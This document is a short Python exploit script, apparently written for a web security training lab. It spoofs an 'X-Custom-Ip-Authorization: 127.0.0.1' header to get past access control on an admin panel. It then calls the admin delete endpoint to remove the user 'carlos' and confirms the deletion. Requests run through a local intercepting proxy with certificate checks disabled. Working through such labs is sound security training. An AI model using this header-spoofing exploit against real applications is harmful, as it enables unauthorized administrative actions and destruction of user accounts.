import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def delete_carlos(url):
    session = requests.session()
    print("(+) Try to delete carlos user...")
    delete_carlos_url = url + "/admin/delete?username=carlos"
    headers = {"X-Custom-Ip-Authorization": "127.0.0.1"}
    res = session.get(delete_carlos_url, headers=headers, verify=False, proxies=proxies)

    res1 = session.get(url + "/admin", headers=headers, verify=False, proxies=proxies)
    if "carlos" not in res1.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Could not delete user")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} https://www.example.com")
        sys.exit(-1)
    
    url = sys.argv[1]
    delete_carlos(url)

if __name__ == "__main__":
    main()